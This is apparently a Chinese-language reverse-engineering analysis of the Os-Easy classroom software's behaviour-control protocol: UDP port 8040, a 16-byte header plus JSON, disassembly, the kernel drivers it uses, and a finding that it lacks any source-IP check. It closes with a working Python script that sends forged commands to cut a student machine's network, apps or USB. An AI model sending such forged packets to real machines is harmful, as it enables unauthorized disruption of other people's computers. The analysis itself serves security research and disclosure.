# 02 行为管控指令

> 本文汇总 Os-Easy 教学系统"行为管控"功能的完整分析：指令通道、报文格式、位标志、执行链路、安全结论。
> 数据来源：样本静态分析（逐指令反汇编）+ 配置 `skin/core.conf`。
> 分析日期：2026-09-15

> 行为管控为独立功能，与"远程命令"（[04 号](./04_远程命令执行.md)）、"黑屏肃静"（[17 号](./17_黑屏肃静功能.md)）分属不同 cmdType。

## 一、管控指令通道

| 项 | 值 |
|---|---|
| 端口 | `8040`（`UdpMessageControllerPort`） |
| 协议 | UDP |
| cmdType | `500` |
| 方向 | 教师端 → 学生端（单播） |

```
教师端 Teacher.exe
  └─ 按位构造 CtrlCode JSON
       └─ 16B头[cmdType][flag1][flag2][len] + JSON
            └─ 遍历在线学生 → 单播 UDP → 学生机:8040
═══════════════════════════════════════
学生端 StudentLogic.dll（8040 接收）
  └─ 解析 cmdType(500) → 翻译成 JSON {"type":"support/stop-device-control",...}
       └─ UDP → 127.0.0.1:8045 → DeviceControl.exe
            └─ NetLimitInterface.dll → OeNetlimit.dll → 驱动执行
（另：LissHelper.exe 也是管控接收器，UDP + JsonCpp 按 type 分发）
```

## 二、线格式

### 2.1 16 字节固定头 + 载荷

```
┌────────────── 16 字节固定头 ──────────────┐
│ [cmdType:u32][flag1:u32][flag2:u32][payloadLen:u32] │
└───────────────────────────────────────────┘
                    +  JSON 载荷（无前缀）
```

| 字段 | 值 | 说明 |
|---|---|---|
| `cmdType` | 500 | 行为管控 |
| `flag1` | 0 | 固定 |
| `flag2` | 0 | 固定 |
| `payloadLen` | N | JSON 字节长度 |
| 载荷 | JSON | 纯 JSON，无任何前缀 |

> 其他 cmdType：11 / 13 / 28 / 79 / 111。

### 2.2 发送函数反汇编（`MainLogic.dll FUN_10064770`，type=500）

```asm
100647b4  MOV [EBP-0x20],0x1f4      ; cmdType = 500
100647bb  MOV [EBP-0x1c],0x0        ; flag1 = 0
100647c2  MOV [EBP-0x18],0x0        ; flag2 = 0
100647d8  MOV ECX,[EBP-0x24]        ; this
100647db  ADD ECX,0x548             ; this+0x548（载荷）
100647e1  CALL 0x10012060           ; 取长度
100647f0  CALL 0x1003f850           ; 写 16B 头 [500][0][0][len]
10064804  CALL 0x100218a0           ; 追加载荷 = this+0x548（纯JSON）
10064811  PUSH 0x10152d38           ; "/*//" 字符串地址
10064816  CALL 0x10008b40           ; 构造 std::string 临时对象
1006481b  MOV [EBP-0x38],EAX        ; 保存返回值 —— 之后从未被读取
1006481e  MOV byte [EBP-0x4],0x1     ; 异常处理状态
10064822  LEA ECX,[EBP-0x30]        ; local_34（发送缓冲）
10064825  CALL 0x10010110           ; local_34.length()
1006482a  PUSH EAX
1006482b  LEA ECX,[EBP-0x30]        ; local_34
1006482e  CALL 0x1000c1a0           ; local_34.get()
10064833  PUSH EAX
10064838  MOV EDX,[EBP-0x24]
1006483b  MOV ECX,[EDX+0x30]
1006483e  CALL 0x1009e070           ; 发送 local_34（16B头 + JSON）
```

逐条判定：

1. `0x10064811` 把 `"/*//"` 压栈，`0x10064816` 构造 `std::string` 对象；
2. 返回值（EAX）存入 `[EBP-0x38]` 后，后续无任何指令再读取它；
3. `0x10064822~0x1006482e` 取长度/缓冲，对象为 `local_34`（`[EBP-0x30]`）；
4. `0x1006483e` 发送的也是 `local_34`。

→ `/*//` 字符串为**异常清理保留的临时对象（死代码）**，未拼入发送缓冲。

> `/*//` 在 C++ 源码中很可能是一段被注释掉的代码残留（`/*` 为注释起点），编译器将其作为字符串常量保留，运行时无任何引用。

## 四、CtrlCode 位标志

反编译 `Teacher.exe FUN_005648c0`：


## 五、停止管控

反编译 `MainLogic.dll` 导出 `UnLoad`（`FUN_10077970`）：

```c
FUN_1012c860(local_50, 0);            // 创建 JSON 对象
FUN_1012c7c0(local_60, -0x44000000);  // 整数值 = -0x44000000
FUN_1012d050(local_50, "CtrlCode");   // 键
FUN_1012cc70(this, piVar3);           // 赋值
FUN_1012ecb0(local_50, &stack_80);    // 序列化
FUN_10067f50(local_14);               // 存入 this+0x548 → 触发 type=500 发送
```

即**停止/清除全部管控** = 发送 `{"CtrlCode": -0x44000000}`（`0xBC000000`）。

## 六、完整执行链路

```
教师端
  Teacher.exe FUN_005648c0  读 NPDControl.json → 按位算 CtrlCode
    └─ FUN_0059ca10  组装 JSON {CtrlCode, apps, cites, keys, sendState, tipInfo, serverIp}
         └─ 传入 MainLogic.dll this+0x548
              └─ FUN_10064770  组包 [500][0][0][len] + JSON
                   └─ FUN_1009e070  遍历在线学生列表 → 单播 UDP
═════════════════════════════════════════════════════════
学生端（监听 8040 = UdpMessageControllerPort）
  StudentLogic.dll 收 type=500
    └─ FUN_100838a0（开管控）/ FUN_100836a0（关管控）
         翻译成 {"type":"support-use-device-control"/"stop-device-control",
                 "networktraffic":x,"network":y,"device":z,"process":w}
         └─ UDP → 127.0.0.1:8045 (0x1F6D)
              └─ DeviceControl.exe
                   ├─ NetLimitInterface.dll → OeNetlimit.dll → OeNetLimit.sys (WFP 断网)
                   ├─ \\.\ProcFireWall (禁应用)
                   └─ easyusbctrl.dll → easyusbflt.sys (禁USB)
```

## 七、驱动级限制原理

| 驱动 | 机制 | 能力 |
|---|---|---|
| `easyusbflt.sys` | 设备栈过滤 + USB 白名单 | USB 限制 |
| `KbFilter.sys` | Hook IRP_MJ_CREATE + IOCTL | 键盘锁（多级） |
| `OeNetLimit.sys` | NDIS LWF + WFP + 速度控制 + DNS 白名单 | 网络限制/断网/限速 |
| `ProcFireWall.sys` | PsSetCreateProcessNotifyRoutine | 程序限制 |
| `FbdATS.sys` | SFilter 文件过滤 | 文件监控 |

### KbFilter.sys 键盘锁等级（IOCTL）

```
IOCTL_KB_INIT / IOCTL_KB_STOP / IOCTL_KB_DISABLE_SPEC
KEYBOARD_ALL_DISALE                              // 全锁
KEYBOARD_ALL_DISALE_EXCEPT_CTRLENTER             // 除 Ctrl+Enter
KEYBOARD_ALL_DISALE_EXCEPT_PASSWORD              // 除密码
KEYBOARD_ALL_DISALE_EXCEPT_PASSWORD_AND_CHINESE  // 除密码+中文
KEYBOARD_ALL_DISALE_EXCEPT_PASSWORD_AND_CHINESE_AND_ALT
KEYBOARD_DISABLE_TASK_MGR                        // 禁任务管理器
KEYBOARD_ALL_RELEASE                             // 释放
```

### OeNetLimit.sys 网络限制

```
IOCTL_SET_SpeedControl disableInternet:%d disableNet:%d isDownLimit:%d
WfpRegisterCallouts / FwpmFilterAdd   // WFP 过滤
AddDnsWhiteListIp                      // DNS 白名单
ProcessCreateMon                       // 进程创建监控
```

## 九、安全结论（无 IP 校验）

```
/IpAddressFilter//     ← 空值 = 无来源 IP 过滤
/Limit/1/              ← 管控使能
/UdpMessageControllerPort/8040/
```

从 `FUN_00438b70`（MMPC 指令分发）看：解析 JSON 后直接按 `type` 字段分发执行，未对来源 IP 做校验。教师 IP（`teaIp`）仅用于后续启动参数，非鉴权依据。

结合：
- 管控走 UDP 明文（16B 头 + JSON）；
- 学生端 LissHelper/StudentLogic 解析后直接执行，不校验源 IP。

→ 任意局域网机器构造 `[500][0][0][len] + CtrlCode JSON` 发 UDP→学生机:8040，可触发对应管控。

## 十、工具开发报文

```python
import struct, json, socket

def build_ctrl(ctrl_code, host, port=8040, extra=None):
    payload_obj = {"CtrlCode": ctrl_code}
    if extra:
        payload_obj.update(extra)
    payload = json.dumps(payload_obj, separators=(',', ':')).encode('utf-8')
    hdr = struct.pack("<IIII", 500, 0, 0, len(payload))
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(hdr + payload, (host, port))
    s.close()

# 禁用网络
build_ctrl(0x01, "192.168.1.100")
# 禁用应用
build_ctrl(0x10, "192.168.1.100")
# 禁 USB
build_ctrl(0x100, "192.168.1.100")
# 全部停止（UnLoad 语义）
build_ctrl(-0x44000000, "192.168.1.100")
```
